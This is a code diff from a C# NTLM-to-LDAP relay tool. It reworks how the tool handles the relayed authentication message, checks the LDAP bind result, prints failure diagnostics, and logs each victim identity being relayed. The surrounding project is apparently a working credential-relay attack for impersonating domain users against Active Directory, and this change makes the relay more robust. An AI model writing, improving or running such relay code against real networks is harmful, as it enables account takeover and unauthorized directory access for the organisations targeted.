@@ -274,21 +274,43 @@ namespace HttpLdapRelay
             string identity = ExtractUsernameFromType3(ntlmType3);
             LogVerbose($"[*] Relaying authentication for: {identity}");
 
-            // Send Type 3 to LDAP
+            // Send Type 3 to LDAP and inspect the BindResponse
+            LdapResult bindResult;
             try
             {
-                session.LdapClient.SendNtlmAuthenticate(ntlmType3);
+                bindResult = session.LdapClient.SendNtlmAuthenticate(ntlmType3);
             }
-            catch
+            catch (Exception ex)
             {
-                Console.WriteLine("Failed session.LdapClient.SendNtlmAuthenticate(ntlmType3);");
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("[!] ✗ LDAP authentication failed");
-                Console.ResetColor();
+                LogError($"[!] LDAP bind transport error: {ex.Message}");
                 session.State = SessionState.Failed;
                 _sessionManager.RemoveSession(session.SessionId);
 
                 SendErrorResponse(context.Response, 401, "Authentication failed");
+                Stop();
+                return;
+            }
+
+            if (bindResult == null || bindResult.ResultCode != 0)
+            {
+                Console.WriteLine();
+                string diagnostic = LdapRelayClient.DiagnoseRelayFailure(
+                    bindResult ?? new LdapResult { ResultCode = -1, DiagnosticMessage = "no bind response" },
+                    _useLdaps);
+
+                if (!string.IsNullOrEmpty(diagnostic))
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine(diagnostic);
+                    Console.ResetColor();
+                }
+
+                session.State = SessionState.Failed;
+                _sessionManager.RemoveSession(session.SessionId);
+
+                SendErrorResponse(context.Response, 401, "Authentication failed");
+                Stop();
+                return;
             }
             Console.WriteLine();
             Console.ForegroundColor = ConsoleColor.Green;
